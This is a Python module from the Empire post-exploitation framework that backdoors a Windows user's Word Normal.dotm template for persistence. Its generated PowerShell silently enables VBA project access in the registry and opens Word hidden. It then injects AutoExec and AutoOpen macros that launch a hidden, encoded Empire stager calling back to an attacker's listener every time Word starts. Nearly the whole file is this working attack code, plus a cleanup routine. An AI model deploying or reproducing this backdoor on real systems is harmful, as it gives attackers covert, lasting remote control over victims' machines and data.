from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Invoke-AbNormalDotm',

            # list of one or more authors for the module
            'Author': ['@0xbadjuju'],

            # more verbose multi-line description of the module
            'Description': ("Backdoor a users normal.dotm file that launches an Empire stager upon opening Word."),

            # True if the module needs to run in the background
            'Background' : True,

            # File extension to save the file as
            'OutputExtension' : None,

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,
            
            # The minimum PowerShell version needed for the module to run
            'MinPSVersion' : '2',

            # list of any references/other comments
            'Comments': [
                'http://blog.netspi.com/',
                'http://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to deploy on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Cleanup' : {
                'Description'   :   'Switch. Cleanup the trigger and any script from specified location.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self):

        listenerName = self.options['Listener']['Value']

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        cleanup = self.options['Cleanup']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
            launcher = launcher.replace("$", "`$")
        # read in the common powerup.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/persistence/Invoke-AbNormalDotm.ps1"

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
            encScript = launcher.split(" ")[-1]

        if cleanup.lower() == 'true': 
            script = "cd HKCU:\\SOFTWARE\\Microsoft\\Office\\;"
            script += "gci . | %{ if(Test-Path Registry::$(Join-Path $_ -ChildPath 'Word\Security')){if((gpv -Path Registry::$(Join-Path $_ -ChildPath 'Word\\Security') -Name AccessVBOM) -eq 1){sp -Path Registry::$(Join-Path $_ -ChildPath 'Word\\Security') -Name AccessVBOM -Value 0;}else{return;}}};"
            script += "cd $env:APPDATA'\\Microsoft\\Templates\\';"
            script += "if(Test-Path normal.dotm.bak){"
            script += "mv -Force normal.dotm.bak normal.dotm;"
            script += "\"File Restored\""
            script += "}else{"
            script += "\"Backup normal.dotm not found\";}"
            return script

        script = "[System.Reflection.Assembly]::LoadWithPartialName(\"Microsoft.Vbe.Interop\") | Out-Null;"
        script += "cd HKCU:\\SOFTWARE\\Microsoft\\Office\\;"
        script += "gci . | %{ if(Test-Path Registry::$(Join-Path $_ -ChildPath 'Word\Security')){if((gpv -Path Registry::$(Join-Path $_ -ChildPath 'Word\\Security') -Name AccessVBOM) -eq 0){sp -Path Registry::$(Join-Path $_ -ChildPath 'Word\\Security') -Name AccessVBOM -Value 1;\"Updated Registry`n\"}else{return;}}};"
        script += "cd $env:APPDATA'\\Microsoft\\Templates\\';"
        script += "$word = New-Object -ComObject Word.Application;"
        script += "\"Opening Word`n\";"
        script += "$word.visible = $false;"
        script += "cp Normal.dotm AbNormal.dotm;"
        script += "$doc = $word.Documents.Open(${env:APPDATA}+'\\Microsoft\\Templates\\AbNormal.dotm');"
        script += "$macro = $doc.VBProject.VBComponents.Add(1);"
        script += "$code = \n" 
        script += "@\"\n"
        script += "sub AutoExec()\n"
        script += "Dim objShell As Object\n"
        script += "Dim objExecObject As Object\n"
        script += "Dim strScript As String\n"
        script += "strScript = \"powershell.exe -NoP -NonI -W Hidden -Enc \"\n"
        for i in range(0, len(encScript), 100):
            script += "strScript = strScript + \"" + encScript[i:i+100] + "\"\n"
        script += "Set objShell = CreateObject(\"WScript.Shell\")\n"
        script += "objShell.Run strScript\n"
        script += "end sub\n\n"
        #Probably superfluous
        script += "sub AutoOpen()\n"
        script += "AutoExec\n"
        script += "end sub\n"
        script += "\"@;"
        script += "$macro.CodeModule.AddFromString($code);"
        script += "$doc.Save();"
        script += "$doc.Close();"
        script += "$word.Quit();"
        script += "\"Wrote Macro`n\";"
        script += "\"Sleeping to wait for file to unlock\";"
        script += "Start-Sleep -s 10;"
        script += "mv Normal.dotm Normal.dotm.bak;"
        script += "mv AbNormal.dotm Normal.dotm;"
        script += "\"Finished\";"
        return script
